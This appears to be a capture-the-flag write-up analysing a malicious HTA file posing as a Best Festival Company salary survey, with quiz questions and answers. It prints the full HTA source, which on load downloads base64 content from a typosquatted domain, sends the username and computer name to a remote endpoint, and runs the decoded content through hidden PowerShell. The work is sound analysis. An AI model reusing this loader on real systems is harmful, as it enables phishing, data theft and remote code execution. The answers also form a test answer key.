# Malware Analysis - Malhare.exe 

Was provided with a file called `survey-1761116087028.hta`

### What are HTA(HTML Application) files?

An HTA file is like a small desktop app built using familiar web technologies such as HTML, CSS, and JavaScript. Unlike regular web pages that open inside a browser, HTA files run directly on Windows through a built-in component called Microsoft HTML Application Host - `mshta.exe` process. This allows them to look and behave like lightweight programs with their own interfaces and actions. In legitimate use cases, HTA files serve several practical purposes in Wareville and beyond:

- Automating administrative or setup tasks.
- Providing quick interfaces for internal scripts.
- Testing small prototypes without building full software.
- Offering lightweight IT support utilities for daily use.

### How can they be used maliciously  ?

**Common purposes of malicious HTA use:**

- **Initial access/delivery**: HTA files are often delivered by phishing (email attachments, fake web pages, or downloads) and run via `mshta.exe`.
- **Downloaders/droppers**: An HTA can execute a script that fetches additional binaries or scripts from the attacker's C2.
- **Obfuscation/evasion:** HTAs can hide intent by embedding encoded data(Base64), by using short VBScript/JScript fragments, or by launching processes with hidden windows.
- **Living-off-the-land**: HTA commonly calls built-in Windows tools (`mshta.exe`, `powershell.exe`, `wscript.exe`, `rundll32.exe`) to avoid adding new binaries to disk.

Contents of `survey-1761116087028.hta` : 

```html
<!DOCTYPE html>
<html>
<head>
<title>Best Festival Company Developer Survey</title>
<hta:application id="APP123080"
applicationname="Festival Elf Survey"
icon="logo.ico"
border="thin"
caption="yes"
maximizebutton="no"
minimizebutton="no"
singleinstance="yes"
windowstate="normal"
sysmenu="yes">
</hta:application>
<script type="text/javascript">
	function visited() {
		document.getElementById("never").style.display = 'none';
		document.getElementById("visited").style.display = 'block';
	}
	function never() {
		document.getElementById("visited").style.display = 'none';
		document.getElementById("never").style.display = 'block';
	}
	function submitted() {
		document.getElementById("spinner").style.display = 'none';
		document.getElementById("questions").style.display = 'none';
		document.getElementById("thanks").style.display = 'block';
	}
	function submit() {
		document.getElementById("submitbutton").style.display = 'none';
		document.getElementById("spinner").style.display = 'inline';
		setTimeout(submitted, 2000);
	}
</script>

<script type="text/vbscript">	
	
	Sub Window_onLoad
		Call getQuestions()
	End Sub
	
	Function getQuestions()
		Dim IE, result, decoded, decodedString
		Set IE = CreateObject("InternetExplorer.Application")
		IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
		Do While IE.ReadyState < 4
		Loop
		result = IE.document.body.innerText
		IE.quit 		

		decoded = decodeBase64(result)
		decodedString = RSBinaryToString(decoded)
        Call provideFeedback(decodedString)
	End Function
	
	Function provideFeedback(feedbackString)	
		Dim strHost, strUser, strDomain
		On Error Resume Next
		strHost = CreateObject("WScript.Network").ComputerName
		strUser = CreateObject("WScript.Network").UserName
		
		Dim IE
		Set IE = CreateObject("InternetExplorer.Application")
		IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost
		Do While IE.ReadyState < 4
		Loop
		IE.quit	
					
		Dim runObject

		Set runObject = CreateObject("Wscript.Shell")
		runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
		
	End Function
		
	Function decodeBase64(base64)
		dim DM, EL
		Set DM = CreateObject("Microsoft.XMLDOM")
		Set EL = DM.createElement("tmp")
		EL.DataType = "bin.base64"
		EL.Text = base64
		decodeBase64 = EL.NodeTypedValue
	end function

	Function RSBinaryToString(xBinary)
		Dim Binary
		If vartype(xBinary)=8 Then Binary = MultiByteToBinary(xBinary) Else Binary = xBinary

		Dim RS, LBinary
		Const adLongVarChar = 201
		Set RS = CreateObject("ADODB.Recordset")
		LBinary = LenB(Binary)

		If LBinary>0 Then
			RS.Fields.Append "mBinary", adLongVarChar, LBinary
			RS.Open
			RS.AddNew
			RS("mBinary").AppendChunk Binary 
			RS.Update
			RSBinaryToString = RS("mBinary")
		Else
			RSBinaryToString = ""
		End If
	End Function
</script>

		<style>
			body {
				font-family: museo_sans,Arial,Helvetica,sans-serif;
				overflow-x: hidden;               		
			}			
			#header {
				background-color: rgb(0, 153, 153);
				box-shadow: rgba(0, 0, 0, .298039) 0 5px 0 0;
				height: 150px;
				width: 100%;				
				z-index: 1000;
				margin-right: auto; 
				margin-left: auto;
			}
			#survey-content {
				width: 100%;
				max-width: 1100px;
				z-index: 1000;
				margin-right: auto;
				margin-left: auto;
			}
			#topbar {
				max-width: 500px;
				float: left;
			}
			#logo {
				
				margin-left 10%;
			}			
			#survey {
				margin-top: 5.0%;
				margin-right: 20px;
				padding-left: 10px;
				padding-right: 10px;
				background-color: rgb(0, 153, 153);
				font-family: inherit;
				font-size: 40px;
				text-color: #F8F8F8;
				font-weight: bold;
				text-transform: uppercase;
				text-decoration: none;
				color: #FFFFFF;				
				float: right;
			}
			#survey-heading {
			color: #FFFFFF; 
			font-family: 'Helvetica Neue', sans-serif; 
			font-weight: bold;
			letter-spacing: -1px;
			line-height: 1; 
			}
			#hp  {
			float: right;    
			margin: -55% 65%;
			}
			#thanks {
			overflow-x: hidden;
			overflow-y: hidden;
			}
		</style>
	</head>
	<body>

		<div id="header">
			<div id="topbar">
				<img id="logo" src="logo.png" alt="logo"></img>
			</div>
			<div id="survey">
				<p id="survey-heading">Insert Survey Heading</p>
			</div>
			
		</div><br>
		<div id="survey-content">
			<h2>Anonymous Salary Feedback</h2>
			
			<div id="questions">
			<div>
			<p> We are looking for your feedback to help us improve our employee relations and to invest in the future of our employees.This survey is completely anonymous and gives you to opportunity to express what you think about Best Festival Company's commitment to its employees. Please take five minutes to complete the following survey.</p>
			</div>
			
			<h3>How long have you been employed at Best Festival Company?</h3>
			<label><input type="radio" name="q1"/> Less than 1 year</label><br />
			<label><input type="radio" name="q1"/> Less than 2 years</label><br />
			<label><input type="radio" name="q1"/> 2 years or more</label>
									
			<h3>Do you feel valued at work?</h3>
			<label><input type="radio" name="q2" />Yes</label><br />
			<label><input type="radio" name="q2" />No</label><br />
			<label><input type="radio" name="q2" />Indecisive</label>
			
			<h3>Do you feel content with your current salary?</h3>
			<label><input type="radio" name="q3" />Yes</label><br />
			<label><input type="radio" name="q3" />No</label><br />
			<label><input type="radio" name="q3" />Indecisive</label>
			
			<h3>By how much do you believe your salary should increase?</h3>
			<label><input type="radio" name="q4" />Up to 5%</label><br />
			<label><input type="radio" name="q4" />Between 5% and 10%</label><br />
			<label><input type="radio" name="q4" />Between 10% and 15%</label><br />
			<label><input type="radio" name="q4" />More that 10%</label><br />		
		</div>		
<input id="submitbutton" type="submit" value="Submit" style="background-color:rgb(0, 153, 153);border:none;border-radius:3px 3px 3px 3px;color:#FFFFFF;padding: 3px 20px;margin-top:25px; font-weight: bold" onMouseOver="this.style.backgroundColor='#ff9900'" onMouseOut="this.style.backgroundColor='#009999'" onclick="submit()" />
<img src="data:image/gif;base64,R0lGODlhEAAQAPQAAP///3d3d/r6+pSUlL29vXp6eouLi+jo6NDQ0IKCgrW1ta2trfDw8MfHx+Dg4J2dnaSkpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAAFUCAgjmRpnqUwFGwhKoRgqq2YFMaRGjWA8AbZiIBbjQQ8AmmFUJEQhQGJhaKOrCksgEla+KIkYvC6SJKQOISoNSYdeIk1ayA8ExTyeR3F749CACH5BAkKAAAALAAAAAAQABAAAAVoICCKR9KMaCoaxeCoqEAkRX3AwMHWxQIIjJSAZWgUEgzBwCBAEQpMwIDwY1FHgwJCtOW2UDWYIDyqNVVkUbYr6CK+o2eUMKgWrqKhj0FrEM8jQQALPFA3MAc8CQSAMA5ZBjgqDQmHIyEAIfkECQoAAAAsAAAAABAAEAAABWAgII4j85Ao2hRIKgrEUBQJLaSHMe8zgQo6Q8sxS7RIhILhBkgumCTZsXkACBC+0cwF2GoLLoFXREDcDlkAojBICRaFLDCOQtQKjmsQSubtDFU/NXcDBHwkaw1cKQ8MiyEAIfkECQoAAAAsAAAAABAAEAAABVIgII5kaZ6AIJQCMRTFQKiDQx4GrBfGa4uCnAEhQuRgPwCBtwK+kCNFgjh6QlFYgGO7baJ2CxIioSDpwqNggWCGDVVGphly3BkOpXDrKfNm/4AhACH5BAkKAAAALAAAAAAQABAAAAVgICCOZGmeqEAMRTEQwskYbV0Yx7kYSIzQhtgoBxCKBDQCIOcoLBimRiFhSABYU5gIgW01pLUBYkRItAYAqrlhYiwKjiWAcDMWY8QjsCf4DewiBzQ2N1AmKlgvgCiMjSQhACH5BAkKAAAALAAAAAAQABAAAAVfICCOZGmeqEgUxUAIpkA0AMKyxkEiSZEIsJqhYAg+boUFSTAkiBiNHks3sg1ILAfBiS10gyqCg0UaFBCkwy3RYKiIYMAC+RAxiQgYsJdAjw5DN2gILzEEZgVcKYuMJiEAOwAAAAAAAAAAAA==" style="display:none" id="spinner" />
</div>
<div id="thanks" style="display:none">
<div id="survey-content">
<div>Thank you for your feedback!</div>
<div>All participants will be entered into a prize draw for a chance to win a trip to the South Pole!</div>
<input id="submitbutton" type="submit" value="Close" style="background-color:rgb(0, 153, 153);border:none;border-radius:3px 3px 3px 3px;color:#FFFFFF;padding: 3px 20px;margin-top:25px; font-weight: bold" onMouseOver="this.style.backgroundColor='#ff9900'" onMouseOut="this.style.backgroundColor='#009999'" onclick="self.close()" />
</div>	
</div>
<div>
</div>
</body>
</html>
```

Q1) What is the title of the HTA Application? 

```html
<title>Best Festival Company Developer Survey</title>
```

A1) `The Best Festival Company Developer Survey` 

Q2) What VBScript function is acting as if it is downloading the survey questions?
```vb
Function getQuestions()
		Dim IE, result, decoded, decodedString
		Set IE = CreateObject("InternetExplorer.Application")
		IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
		Do While IE.ReadyState < 4
		Loop
		result = IE.document.body.innerText
		IE.quit 		
		decoded = decodeBase64(result)
		decodedString = RSBinaryToString(decoded)
        Call provideFeedback(decodedString)
	End Function
```

A2) `getQuestions`

Q3) What URL domain (including sub-domain) is the "questions" being downloaded from?

```vb
IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
```

A3) `survey.bestfestiivalcompany.com`

Q4) Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?

A4) `i`

Q5) Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?

```html
			<h3>How long have you been employed at Best Festival Company?</h3>
			<label><input type="radio" name="q1"/> Less than 1 year</label><br/>
			<label><input type="radio" name="q1"/> Less than 2 years</label><br />
			<label><input type="radio" name="q1"/> 2 years or more</label>
									
			<h3>Do you feel valued at work?</h3>
			<label><input type="radio" name="q2" />Yes</label><br />
			<label><input type="radio" name="q2" />No</label><br />
			<label><input type="radio" name="q2" />Indecisive</label>
			
			<h3>Do you feel content with your current salary?</h3>
			<label><input type="radio" name="q3" />Yes</label><br />
			<label><input type="radio" name="q3" />No</label><br />
			<label><input type="radio" name="q3" />Indecisive</label>
			
			<h3>By how much do you believe your salary should increase?</h3>
			<label><input type="radio" name="q4" />Up to 5%</label><br />
			<label><input type="radio" name="q4" />Between 5% and 10%</label><br />
			<label><input type="radio" name="q4" />Between 10% and 15%</label><br />
			<label><input type="radio" name="q4" />More that 10%</label><br />		
		</div>		

```

A5) `4`

Q6) Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?

```html
<div>All participants will be entered into a prize draw for a chance to win a trip to the South Pole!</div>
```

A6) `All participants will be entered into a price draw for a chance to win a trip to the South Pole!`

Q7) The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.

```vb
		strHost = CreateObject("WScript.Network").ComputerName
		strUser = CreateObject("WScript.Network").UserName
```

A7) `ComputerName,UserName`

Q8) What endpoint is the enumerated data being exfiltrated to?

```vb
		IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost
```

A8) `/details`

Q9) What HTTP method is being used to exfiltrate the data?

A9) `GET`

Q10) After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?

A10) `runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False`

Q11) It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from [here](https://assets.tryhackme.com/additional/aoc2025/files/blob.txt). What popular encoding scheme was used in an attempt to obfuscate the download?

```
ZnVuY3Rpb24gQUFCQiB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkpXQogICAgICAgIFtzdHJpbmddJFRleHQKICAgICkKCiAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgJFRleHQuTGVuZ3RoCiAgICBmb3JlYWNoICgkY2ggaW4gJFRleHQuVG9DaGFyQXJyYXkoKSkgewogICAgICAgICRjID0gW2ludF1bY2hhcl0kY2gKCiAgICAgICAgaWYgKCRjIC1nZSA2NSAtYW5kICRjIC1sZSA5MCkgeyAgICAgICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDY1ICsgMTMpICUgMjYpICsgNjUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkYyAtZ2UgOTcgLWFuZCAkYyAtbGUgMTIyKSB7ICAgICAgCiAgICAgICAgICAgICRjID0gKCgkYyAtIDk3ICsgMTMpICUgMjYpICsgOTcKICAgICAgICB9CgogICAgICAgIFt2b2lkXSRzYi5BcHBlbmQoW2NoYXJdJGMpCiAgICB9CiAgICAkc2IuVG9TdHJpbmcoKQp9CgokZmxhZyA9ICdHVVp7Wm55am5lci5OYW55bGZycX0nCgokZGVjbyA9IEFBQkIgLVRleHQgJGZsYWcKV3JpdGUtT3V0cHV0ICRkZWNv
```

On passing it through the cipher identifier of `dcode.fr`, I got to know that it was base64. 

A11) `base64`

Q12) Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?

Decoded payload: 

```powershell
function AABB {  
   [CmdletBinding()]  
   param(  
       [Parameter(Mandatory)]  
       [string]$Text  
   )  
  
   $sb = New-Object System.Text.StringBuilder $Text.Length  
   foreach ($ch in $Text.ToCharArray()) {  
       $c = [int][char]$ch  
  
       if ($c -ge 65 -and $c -le 90) {            
           $c = (($c - 65 + 13) % 26) + 65  
       }  
       elseif ($c -ge 97 -and $c -le 122) {        
           $c = (($c - 97 + 13) % 26) + 97  
       }  
  
       [void]$sb.Append([char]$c)  
   }  
   $sb.ToString()  
}  
  
$flag = 'GUZ{Znyjner.Nanylfrq}'
```

After reading the script, we can clearly see that each character is incremented by 13, making it a rot13 cipher

A12) `rot13`

Q13) Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?

A13) `THM{Malware.Analysed}`











